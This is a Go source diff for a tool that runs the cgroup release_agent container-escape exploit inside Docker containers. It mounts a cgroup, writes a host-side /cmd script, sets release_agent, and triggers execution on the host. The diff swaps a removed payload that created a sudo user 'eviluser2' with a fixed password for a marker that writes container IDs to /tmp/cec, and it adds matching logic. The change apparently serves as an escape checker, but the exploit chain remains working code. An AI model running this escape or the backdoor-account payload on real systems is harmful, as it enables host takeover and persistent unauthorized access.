@@ -45,10 +45,9 @@ func main() {
 		commands := [][]string{
 			{"sh", "-c", `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x`},
 			{"sh", "-c", `echo 1 > /tmp/cgrp/x/notify_on_release`},
-			//{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
-			{"sh", "-c", `echo '#!/bin/sh\n/usr/sbin/useradd -G sudo eviluser2\necho "eviluser2:evil1234" | /usr/sbin/chpasswd' > /cmd && chmod +x /cmd`},
+			{"sh", "-c", `echo '#!/bin/sh\necho "` + container.ID + `" >> /tmp/cec' > /cmd && chmod +x /cmd`},
 			{"sh", "-c", `echo "$(mount | grep overlay2 | grep -oP 'upperdir=\K[^,]*')/cmd" > /tmp/cgrp/release_agent`},
-			{"sh", "-c", `echo \$\$ > /tmp/cgrp/x/cgroup.procs`},
+			{"sh", "-c", `sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`},
 		}
 		for _, cmd := range commands {
 			execConfig := types.ExecConfig{
@@ -71,7 +70,6 @@ func main() {
 	// 1秒待機
 	time.Sleep(1 * time.Second)
 
-	// ファイルを読み込み、配列と比較
 	file, err = os.Open(filePath)
 	if err != nil {
 		fmt.Println("Error opening file:", err)
@@ -79,12 +77,18 @@ func main() {
 	}
 	defer file.Close()
 
+	lines := []string{}
 	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+
 	for i, containerID := range containerIDs {
-		scanner.Scan()
-		line := scanner.Text()
-		if line == containerID {
-			fmt.Printf("Match found at index %d: %s\n", i, containerID)
+		for j, line := range lines {
+			if line == containerID {
+				fmt.Printf("Match found at index %d (file line %d): %s\n", i, j, containerID)
+				break
+			}
 		}
 	}
 
